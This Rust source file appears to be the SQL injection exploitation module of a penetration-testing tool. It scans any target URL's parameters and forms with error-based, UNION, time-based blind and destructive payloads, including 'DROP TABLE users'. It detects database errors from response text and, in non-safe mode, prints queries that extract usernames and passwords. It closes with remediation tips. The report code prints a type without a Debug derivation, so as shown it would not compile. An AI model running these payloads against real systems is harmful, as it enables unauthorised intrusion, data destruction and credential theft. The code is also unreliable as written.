use crate::utils::{error::FortiCoreResult, FortiCoreError};
use colored::*;
use regex::Regex;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT};
use reqwest::{Client, Response, StatusCode};
use std::collections::{HashMap, HashSet};
use tokio::time::{sleep, Duration};
use url::Url;

// List of SQL Injection payloads to test
const SQLI_BASIC_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "'; DROP TABLE users; --",
    "1'; SELECT 1,2,3 FROM dual --",
];

const SQLI_DETECTION_PATTERNS: &[&str] = &[
    "SQL syntax",
    "mysql_fetch",
    "ORA-00933",
    "Microsoft SQL Server",
    "PostgreSQL",
    "sqlite3",
    "SQLite",
    "ODBC Driver",
    "syntax error",
    "unexpected",
    "unterminated",
    "not a valid",
    "error in your SQL",
    "SQL command not properly ended",
    "unclosed quotation mark",
];

const SQLI_BLIND_PAYLOADS: &[&str] = &[
    "' AND SLEEP(3) --",
    "\" AND SLEEP(3) --",
    "' AND pg_sleep(3) --",
    "\" AND pg_sleep(3) --",
    "' AND 1=2 --",
    "' AND 1=1 --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
];

const UNION_SELECT_PAYLOADS: &[&str] = &[
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL --",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
    "' UNION SELECT version() --",
    "' UNION SELECT @@version --",
    "' UNION SELECT database() --",
    "' UNION SELECT schema_name --",
];

// Types of SQL injections
enum SqliType {
    Error,          // Error-based
    Union,          // UNION-based
    Blind,          // Blind
    TimeBasedBlind, // Time-based blind
    Boolean,        // Boolean-based blind
}

// Structure to track SQL injection vulnerabilities
struct SqliVulnerability {
    param_name: String,
    payload: String,
    injection_point: String,
    sqli_type: SqliType,
    evidence: String,
    extractable_data: bool,
}

pub async fn exploit(target: &str, safe_mode: bool, verbose: bool) -> FortiCoreResult<()> {
    println!(
        "{}",
        "Starting SQL Injection exploitation module...".bright_yellow()
    );

    if !safe_mode {
        println!(
            "{}",
            "Warning: Safe mode is disabled. Running full SQL injection exploits.".bright_red()
        );
    }

    // Normalize URL
    let target_url = normalize_url(target);
    let parsed_url = Url::parse(&target_url)
        .map_err(|e| FortiCoreError::InputError(format!("Invalid URL format: {}", e)))?;

    if verbose {
        println!("Targeting URL: {}", target_url);
    }

    // Create HTTP client with appropriate headers
    let client = create_client()?;

    // First, identify potential injection points
    println!(
        "{}",
        "Phase 1: Identifying potential injection points...".bright_blue()
    );
    let (forms, parameters) = find_injection_points(&client, &target_url, verbose).await?;

    if forms.is_empty() && parameters.is_empty() {
        println!("{}", "No suitable injection points found.".bright_yellow());
        return Ok(());
    }

    println!(
        "{}",
        "Phase 2: Testing SQL injection vectors...".bright_blue()
    );

    // Store discovered vulnerabilities
    let mut vulnerabilities = Vec::new();

    // Test URL parameters for GET-based SQL injection
    for param in &parameters {
        println!("Testing parameter: {}", param);

        // Step 1: Test for basic SQL injection using error-based techniques
        for payload in SQLI_BASIC_PAYLOADS {
            if verbose {
                println!("Testing payload: {}", payload);
            }

            let (is_vulnerable, evidence, error_type) =
                test_get_parameter_sqli(&client, &parsed_url, param, payload, verbose).await?;

            if is_vulnerable {
                println!(
                    "{}",
                    format!("SQL injection vulnerability found in parameter: {}", param)
                        .bright_red()
                );

                vulnerabilities.push(SqliVulnerability {
                    param_name: param.to_string(),
                    payload: payload.to_string(),
                    injection_point: "URL Parameter".to_string(),
                    sqli_type: error_type,
                    evidence: evidence.to_string(),
                    extractable_data: false,
                });

                // Try to determine if data can be extracted
                if !safe_mode {
                    for union_payload in UNION_SELECT_PAYLOADS {
                        if verbose {
                            println!("Testing UNION payload: {}", union_payload);
                        }

                        let (union_vulnerable, union_evidence, _) = test_get_parameter_sqli(
                            &client,
                            &parsed_url,
                            param,
                            union_payload,
                            verbose,
                        )
                        .await?;

                        if union_vulnerable {
                            // Update extractable_data for the last vulnerability
                            if let Some(vuln) = vulnerabilities.last_mut() {
                                vuln.extractable_data = true;
                                vuln.evidence = union_evidence.to_string();
                                vuln.sqli_type = SqliType::Union;
                            }
                            break;
                        }
                    }

                    // Try time-based techniques as well
                    if let Some(vuln) = vulnerabilities.last() {
                        if matches!(vuln.sqli_type, SqliType::Error) {
                            for blind_payload in SQLI_BLIND_PAYLOADS.iter().take(3) {
                                let start_time = std::time::Instant::now();
                                let _ = test_get_parameter_sqli(
                                    &client,
                                    &parsed_url,
                                    param,
                                    blind_payload,
                                    false,
                                )
                                .await?;
                                let elapsed = start_time.elapsed();

                                if elapsed.as_secs() >= 2 {
                                    println!(
                                        "{}",
                                        "Time-based blind SQL injection confirmed!".bright_red()
                                    );
                                    if let Some(vuln) = vulnerabilities.last_mut() {
                                        vuln.sqli_type = SqliType::TimeBasedBlind;
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }

                // If in safe mode, just report the first vulnerability per parameter
                if safe_mode {
                    break;
                }
            }

            // Slight delay to avoid flooding the server
            sleep(Duration::from_millis(300)).await;
        }
    }

    // Test forms for POST-based SQL injection
    if !forms.is_empty() {
        println!("{}", "Testing forms for SQL injection...".bright_blue());

        for (i, form) in forms.iter().enumerate() {
            println!("Testing form #{} at: {}", i + 1, form.action);

            for (field_name, field_type) in &form.fields {
                // Only test text-like fields
                if !is_text_field(field_type) {
                    continue;
                }

                // Test basic SQL injection payloads
                for payload in SQLI_BASIC_PAYLOADS {
                    if verbose {
                        println!(
                            "Testing form field '{}' with payload: {}",
                            field_name, payload
                        );
                    }

                    let (is_vulnerable, evidence, error_type) =
                        test_post_form_sqli(&client, form, field_name, payload, verbose).await?;

                    if is_vulnerable {
                        println!(
                            "{}",
                            format!(
                                "SQL injection vulnerability found in form field: {}",
                                field_name
                            )
                            .bright_red()
                        );

                        vulnerabilities.push(SqliVulnerability {
                            param_name: field_name.to_string(),
                            payload: payload.to_string(),
                            injection_point: format!("Form #{}", i + 1),
                            sqli_type: error_type,
                            evidence: evidence.to_string(),
                            extractable_data: false,
                        });

                        // If in safe mode, just report the first vulnerability per field
                        if safe_mode {
                            break;
                        }
                    }

                    // Slight delay to avoid flooding the server
                    sleep(Duration::from_millis(300)).await;
                }
            }
        }
    }

    // Phase 3: Report findings and attempt limited data extraction if appropriate
    println!(
        "{}",
        "Phase 3: SQL Injection exploitation results".bright_blue()
    );

    if vulnerabilities.is_empty() {
        println!(
            "{}",
            "No SQL injection vulnerabilities were found.".bright_green()
        );
    } else {
        println!(
            "{}",
            format!(
                "Found {} SQL injection vulnerabilities:",
                vulnerabilities.len()
            )
            .bright_red()
        );

        for (i, vuln) in vulnerabilities.iter().enumerate() {
            println!("\n{}", format!("Vulnerability #{}", i + 1).bright_yellow());
            println!("Location: {} ({})", vuln.injection_point, vuln.param_name);
            println!("Type: {:?}", vuln.sqli_type);
            println!("Payload: {}", vuln.payload);

            // Display evidence snippet, but not the whole response
            let evidence_preview = if vuln.evidence.len() > 150 {
                format!("{}...", &vuln.evidence[0..150])
            } else {
                vuln.evidence.clone()
            };
            println!("Evidence: {}", evidence_preview);

            // Show possible extractable data
            if vuln.extractable_data && !safe_mode {
                println!("{}", "Data extraction potential:".bright_red());
                println!("- Database schema information is extractable");
                println!("- User table data could be extractable");

                // Simulate data extraction
                match vuln.sqli_type {
                    SqliType::Union => {
                        println!("{}", "UNION-based data extraction examples:".bright_red());
                        println!(
                            "- {} UNION SELECT table_name,NULL FROM information_schema.tables --",
                            vuln.payload
                        );
                        println!("- {} UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --", vuln.payload);
                        println!(
                            "- {} UNION SELECT username,password FROM users --",
                            vuln.payload
                        );
                    }
                    SqliType::TimeBasedBlind => {
                        println!(
                            "{}",
                            "Time-based blind data extraction examples:".bright_red()
                        );
                        println!("- {} AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0) --", vuln.payload);
                    }
                    _ => {
                        println!(
                            "- Advanced extraction payloads available for this injection type"
                        );
                    }
                }
            }
        }

        // Provide mitigation guidance
        println!("\n{}", "Remediation recommendations:".bright_yellow());
        println!("1. Use prepared statements or parameterized queries");
        println!("2. Apply input validation and sanitization");
        println!("3. Implement least privilege database access");
        println!("4. Use ORM frameworks with proper security features");
        println!("5. Sanitize error messages to avoid information leakage");
        println!("6. Implement a Web Application Firewall (WAF)");
    }

    Ok(())
}

// Define a structure to represent HTML forms
struct HtmlForm {
    action: String,
    method: String,
    fields: Vec<(String, String)>,         // (name, type)
    other_inputs: HashMap<String, String>, // hidden fields etc.
}

// Find forms and parameters for injection
async fn find_injection_points(
    client: &Client,
    url: &str,
    verbose: bool,
) -> FortiCoreResult<(Vec<HtmlForm>, Vec<String>)> {
    if verbose {
        println!("Scanning for injection points at: {}", url);
    }

    // Get the main page content
    let resp = client.get(url).send().await.map_err(|e| {
        FortiCoreError::NetworkError(format!("Failed to connect to {}: {}", url, e))
    })?;

    let body = resp
        .text()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to read response: {}", e)))?;

    // Extract forms
    let forms = extract_forms(&body, url);
    if verbose {
        println!("Found {} forms", forms.len());
        for (i, form) in forms.iter().enumerate() {
            println!(
                "Form #{}: Action={}, Method={}, Fields={}",
                i + 1,
                form.action,
                form.method,
                form.fields.len()
            );
        }
    }

    // Extract URL parameters from the query string
    let parsed_url = Url::parse(url).unwrap(); // Safe because we normalized it earlier
    let parameters = parsed_url
        .query_pairs()
        .map(|(key, _)| key.to_string())
        .collect::<Vec<String>>();

    if verbose && !parameters.is_empty() {
        println!(
            "Found {} URL parameters: {:?}",
            parameters.len(),
            parameters
        );
    }

    Ok((forms, parameters))
}

// Extract forms from HTML content
fn extract_forms(html: &str, base_url: &str) -> Vec<HtmlForm> {
    let mut forms = Vec::new();

    // Extract forms using regex
    let form_regex = Regex::new(r"<form[^>]*>(.*?)</form>").unwrap();
    let form_attrs_regex = Regex::new(r#"<form\s+([^>]*)>"#).unwrap();
    let action_regex = Regex::new(r#"action=["']([^"']*)["']"#).unwrap();
    let method_regex = Regex::new(r#"method=["']([^"']*)["']"#).unwrap();
    let input_regex = Regex::new(r#"<input\s+([^>]*)>"#).unwrap();
    let name_regex = Regex::new(r#"name=["']([^"']*)["']"#).unwrap();
    let type_regex = Regex::new(r#"type=["']([^"']*)["']"#).unwrap();
    let value_regex = Regex::new(r#"value=["']([^"']*)["']"#).unwrap();

    for form_match in form_regex.captures_iter(html) {
        let form_html = &form_match[0];

        // Get form attributes
        let mut action = String::new();
        let mut method = "get".to_string(); // Default to GET

        if let Some(attrs_match) = form_attrs_regex.captures(form_html) {
            let attrs = &attrs_match[1];

            if let Some(action_match) = action_regex.captures(attrs) {
                action = action_match[1].to_string();
            }

            if let Some(method_match) = method_regex.captures(attrs) {
                method = method_match[1].to_lowercase();
            }
        }

        // Resolve relative URL
        if !action.starts_with("http") {
            if action.starts_with("/") {
                let base = Url::parse(base_url).unwrap();
                action = format!(
                    "{}://{}{}",
                    base.scheme(),
                    base.host_str().unwrap_or(""),
                    action
                );
            } else if action.is_empty() {
                action = base_url.to_string();
            } else {
                // Assume action is relative to the current page
                if base_url.ends_with("/") {
                    action = format!("{}{}", base_url, action);
                } else {
                    action = format!("{}/{}", base_url, action);
                }
            }
        }

        // Extract input fields
        let mut fields = Vec::new();
        let mut other_inputs = HashMap::new();

        for input_match in input_regex.captures_iter(form_html) {
            let input_attrs = &input_match[1];

            let mut name = String::new();
            let mut input_type = "text".to_string(); // Default to text
            let mut value = String::new();

            if let Some(name_match) = name_regex.captures(input_attrs) {
                name = name_match[1].to_string();
            }

            if let Some(type_match) = type_regex.captures(input_attrs) {
                input_type = type_match[1].to_lowercase();
            }

            if let Some(value_match) = value_regex.captures(input_attrs) {
                value = value_match[1].to_string();
            }

            // Skip inputs without a name
            if name.is_empty() {
                continue;
            }

            // Standard visible inputs go to fields
            if is_text_field(&input_type) {
                fields.push((name, input_type));
            } else {
                // Hidden fields and others go to other_inputs
                other_inputs.insert(name, value);
            }
        }

        forms.push(HtmlForm {
            action,
            method,
            fields,
            other_inputs,
        });
    }

    forms
}

// Is this a text-like input field that could accept SQLi payloads?
fn is_text_field(field_type: &str) -> bool {
    matches!(
        field_type,
        "text" | "search" | "number" | "url" | "tel" | "email" | "password" | "textarea" | ""
    )
}

// Test a GET parameter for SQL injection
async fn test_get_parameter_sqli(
    client: &Client,
    base_url: &Url,
    param: &str,
    payload: &str,
    verbose: bool,
) -> FortiCoreResult<(bool, String, SqliType)> {
    // Create a new URL with the SQLi payload in the parameter
    let mut url = base_url.clone();
    {
        let mut query_pairs = url.query_pairs_mut();
        query_pairs.clear();

        // Add original parameters from the base URL
        for (key, value) in base_url.query_pairs() {
            if key == param {
                query_pairs.append_pair(&key, payload);
            } else {
                query_pairs.append_pair(&key, &value);
            }
        }

        // If param wasn't in the original query, add it
        if !base_url.query_pairs().any(|(key, _)| key == param) {
            query_pairs.append_pair(param, payload);
        }
    }

    if verbose {
        println!("Testing URL: {}", url);
    }

    // Send the request
    let resp = client
        .get(url.as_str())
        .send()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to connect: {}", e)))?;

    // Check the response for SQL errors
    check_sql_injection_response(resp, payload).await
}

// Test a form field for SQL injection via POST
async fn test_post_form_sqli(
    client: &Client,
    form: &HtmlForm,
    field_name: &str,
    payload: &str,
    verbose: bool,
) -> FortiCoreResult<(bool, String, SqliType)> {
    // Build form data
    let mut form_data = HashMap::new();

    // Add all hidden and other input fields
    for (key, value) in &form.other_inputs {
        form_data.insert(key.clone(), value.clone());
    }

    // Add our test field with the SQL injection payload
    form_data.insert(field_name.to_string(), payload.to_string());

    // Add other visible fields with dummy values
    for (name, _) in &form.fields {
        if name != field_name && !form_data.contains_key(name) {
            form_data.insert(name.clone(), "test123".to_string());
        }
    }

    if verbose {
        println!("Submitting to form action: {}", form.action);
        println!("With test payload in field: {}", field_name);
    }

    // Send request based on the form method
    let resp = if form.method == "post" {
        client
            .post(&form.action)
            .form(&form_data)
            .send()
            .await
            .map_err(|e| FortiCoreError::NetworkError(format!("Failed to submit form: {}", e)))?
    } else {
        // For GET methods, convert form data to query parameters
        let mut url = Url::parse(&form.action)
            .map_err(|e| FortiCoreError::InputError(format!("Invalid form action URL: {}", e)))?;

        {
            let mut query_pairs = url.query_pairs_mut();
            for (key, value) in &form_data {
                query_pairs.append_pair(key, value);
            }
        }

        client
            .get(url.as_str())
            .send()
            .await
            .map_err(|e| FortiCoreError::NetworkError(format!("Failed to submit form: {}", e)))?
    };

    // Check the response for SQL errors
    check_sql_injection_response(resp, payload).await
}

// Check if the SQL injection payload was successful
async fn check_sql_injection_response(
    resp: Response,
    payload: &str,
) -> FortiCoreResult<(bool, String, SqliType)> {
    // First, check status code - a 500 error can indicate SQL injection
    if resp.status() == StatusCode::INTERNAL_SERVER_ERROR {
        return Ok((
            true,
            "500 Internal Server Error".to_string(),
            SqliType::Error,
        ));
    }

    // Get response body
    let body = resp
        .text()
        .await
        .map_err(|e| FortiCoreError::NetworkError(format!("Failed to read response: {}", e)))?;

    // Check for SQL error messages
    for pattern in SQLI_DETECTION_PATTERNS {
        if body.contains(pattern) {
            // Find the context - extract the surrounding text
            let pattern_index = body.find(pattern).unwrap();
            let start = if pattern_index > 50 {
                pattern_index - 50
            } else {
                0
            };
            let end = std::cmp::min(pattern_index + pattern.len() + 150, body.len());

            let context = body[start..end].to_string();
            return Ok((true, context, SqliType::Error));
        }
    }

    // Check for UNION injection success
    if payload.contains("UNION SELECT")
        && (body.contains("version()")
            || body.contains("@@version")
            || body.contains("schema_name")
            || body.contains("database()"))
    {
        return Ok((
            true,
            "UNION injection successful".to_string(),
            SqliType::Union,
        ));
    }

    // No SQL injection detected
    Ok((false, String::new(), SqliType::Error))
}

fn normalize_url(url: &str) -> String {
    if !url.starts_with("http://") && !url.starts_with("https://") {
        format!("http://{}", url)
    } else {
        url.to_string()
    }
}

fn create_client() -> FortiCoreResult<Client> {
    let mut headers = HeaderMap::new();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) FortiCore/0.1.0"),
    );

    let client = Client::builder()
        .default_headers(headers)
        .timeout(std::time::Duration::from_secs(15))
        .build()
        .map_err(|e| {
            FortiCoreError::NetworkError(format!("Failed to create HTTP client: {}", e))
        })?;

    Ok(client)
}
